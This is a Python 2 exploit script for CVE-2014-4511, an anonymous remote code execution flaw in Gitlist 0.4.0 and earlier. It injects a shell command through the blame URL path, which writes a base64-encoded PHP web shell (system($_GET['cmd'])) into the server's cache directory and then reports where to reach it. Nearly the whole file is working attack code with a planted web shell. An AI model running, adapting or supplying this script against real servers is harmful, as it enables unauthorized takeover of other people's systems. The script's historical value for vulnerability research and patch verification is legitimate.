from commands import getoutput
import urllib
import sys
from commands import getoutput
import urllib
import sys
 
"""
Exploit Title: Gitlist <= 0.4.0 anonymous RCE
Date: 06/20/2014
Author: drone (@dronesec)
Vendor Homepage: http://gitlist.org/
Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz
Version: <= 0.4.0
Fixed in: 0.5.0
Tested on: Debian 7
More information: http://hatriot.github.io/blog/2014/06/29/gitlist-rce/
cve: CVE-2014-4511
"""
 
if len(sys.argv) <= 1:
    print '%s: [url to git repo] {cache path}' % sys.argv[0]
    print '  Example: python %s http://localhost/gitlist/my_repo.git' % sys.argv[0]
    print '  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache' % sys.argv[0]
    sys.exit(1)
 
url = sys.argv[1]
url = url if url[-1] != '/' else url[:-1]
 
path = "/var/www/gitlist/cache"
if len(sys.argv) > 2:
    path = sys.argv[2]
 
print '[!] Using cache location %s' % path
 
# payload <?system($_GET['cmd']);?>
payload = "PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo="
 
# sploit; python requests does not like this URL, hence wget is used
mpath = '/blame/master/""`echo {0}|base64 -d > {1}/x.php`'.format(payload, path)
mpath = url+ urllib.quote(mpath)
 
out = getoutput("wget %s" % mpath)
if '500' in out:
    print '[!] Shell dropped; go hit %s/cache/x.php?cmd=ls' % url.rsplit('/', 1)[0]
else:
    print '[-] Failed to drop'
    print out
